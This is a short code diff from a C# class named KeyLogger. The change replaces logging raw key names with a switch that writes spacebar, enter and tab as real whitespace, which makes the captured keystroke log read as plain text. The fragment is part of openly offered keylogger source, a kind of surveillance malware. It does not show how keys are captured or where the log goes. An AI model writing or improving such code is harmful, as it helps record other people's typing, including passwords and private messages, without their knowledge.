@@ -80,7 +80,24 @@ class KeyLogger
                 {
                     Console.WriteLine((ConsoleKey)i);
                     ConsoleKey key = (ConsoleKey)i; // The enum of Console Key is use to find which key was used 
-                    write_file(key.ToString());
+                    switch (key)
+                    {
+                        case ConsoleKey.Spacebar:
+                            write_file(" ");
+                            break;
+                        case ConsoleKey.Enter:
+                            write_file("\n");
+                            break;
+                        case ConsoleKey.Tab: 
+                            write_file("\t");
+                            break;
+                        default:
+                            write_file(key.ToString());
+                            break;
+                    }
+                        
+                        
+                    
                 }
             }
 
